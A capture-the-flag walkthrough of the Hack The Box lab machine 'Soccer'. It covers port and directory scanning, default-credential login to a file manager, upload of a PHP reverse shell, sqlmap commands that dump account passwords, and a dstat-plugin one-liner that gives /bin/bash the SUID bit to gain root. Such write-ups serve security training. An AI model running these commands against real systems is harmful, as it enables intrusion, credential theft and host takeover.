# Soccer!
## @Author : M3tr1c_r00t

![](https://i.imgur.com/odvg0ns.png)
Soccer is an easy linux machine where you dump creds from an sql database to gain user priviledges and exploit the doas binary to root.

### Enumeration...
***Nmap...***
```
# Nmap 7.92 scan initiated Sun Dec 18 06:02:09 2022 as: nmap -sC -sV -A -p 22,80,9091 -oN nmapports.txt 10.129.87.122
Nmap scan report for 10.129.87.122
Host is up (0.24s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Sun, 18 Dec 2022 03:01:58 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Sun, 18 Dec 2022 03:01:59 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   234.01 ms 10.10.14.1
2   235.04 ms 10.129.87.122

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Dec 18 06:02:50 2022 -- 1 IP address (1 host up) scanned in 41.42 seconds

```
We can visit the web-server and get a look at it...
![](https://i.imgur.com/YVpXqw7.jpg)

***Ffuf scan...***
```
ffuf -u http://soccer.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://soccer.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

#                       [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 246ms]
# directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 247ms]
#                       [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 247ms]
# Copyright 2007 James Fisher [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 248ms]
# Priority ordered case insensative list, where entries were found  [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 249ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 249ms]
# on atleast 2 different hosts [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 249ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 250ms]
#                       [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 250ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 250ms]
                        [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 251ms]
#                       [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 252ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 239ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 239ms]
tiny                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 234ms]

```

#### Access as www-data...
![](https://i.imgur.com/wHJ72zi.png)

Seeing this manager framework, i went to google and found its default creds which gave me initial access...
![](https://i.imgur.com/9LDNj8g.png)
Now, we can upload files to the manager...
![](https://i.imgur.com/QbVsoFl.png)
With that, we can now upload files to the tiny directory.
<br> So, we can upload a php reverse shell...
![](https://i.imgur.com/dt05vnH.png)
Get from payloadsallthethings github...
![](https://i.imgur.com/CZnzCa3.png)
Next, set up your listener then run the phprevscript....
![](https://i.imgur.com/rBwaCLh.png)

#### User Access...
While in the machine, i found some creds to a sql database...
<br> With that, i looked at the box's open ports and found an internal database...
![](https://i.imgur.com/AL5MzVZ.png)
(I was playing a K.O.T.H game, hence the lower left terminal ':)')
So that i could try and dump the database, i first connected the machine to chisel, then ran sqlmap against the port ...
```
refernces:

<ambassador>
https://ap3x.github.io/posts/pivoting-with-chisel/
```
![](https://i.imgur.com/LEZKHs7.png)
Sqlmap verifies that the databse is vulnerable and we can do a dump...
```
sqlmap -u "http://localhost:8081/?id=1" --batch -dbs
```
![](https://i.imgur.com/ItqfWNG.png)
Now, dump the database...
you can also check out the databases qualities using...
```
sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -D soccer_db -tables
sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -D soccer_db -T accounts -columns

```
Dumping ...
```
 sqlmap -u "http://localhost:8081/?id=1" --batch -D soccer_db -T accounts -C username,password -dump
```
![](https://i.imgur.com/NFSALzv.png)
And we've gotten the creds...
### Priv Esc...
Checking out the suid files...
```
player@soccer:~$ find / -perm -4000 2>/dev/null
/usr/local/bin/doas
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/at
```
We can see there's a doas binary...
<br> Also, in the /usr/local/etc/ directory, we find a doas.conf file which allows the user to run the doas binary without root password as root...
```
player@soccer:/usr/local/etc$ cat doas.conf 
permit nopass player as root cmd /usr/bin/dstat
```
It also tells us that we can run dstat as root...
![](https://i.imgur.com/HnvxmP9.png)
After a bit of googling, we find that dstat has plugins...
![](https://i.imgur.com/9mhTOyZ.png)
It says that a person can create thier own plugin for dstat, and with that, we have our entry point...

Another good thing, we have write permissions in dsats plugin directory...
```
player@soccer:~$ ls -la /usr/local/share/dstat
drwxrwx--- 2 root player 4096 Dec 12 14:53 .
drwxr-xr-x 6 root root   4096 Nov 17 09:16 ..
```
We can then create a python script that returns the bash suid capabilities...
```
player@soccer:/usr/local/share/dstat$ echo 'import os;os.system("chmod u+s /bin/bash")' > dstat_privesc.py

```
![](https://i.imgur.com/vuwpn41.jpg)



```
player@soccer:/usr/local/share/dstat$ doas -u root /usr/bin/dstat --privesc &>/dev/null
```
After that, run the script...
<br> Then type bash -p and we are root!

Done!
### Socials
@Instagram:https://instagram.com/M3tr1c_r00t
<br>@Twitter:https://twitter.com/M3tr1c_root
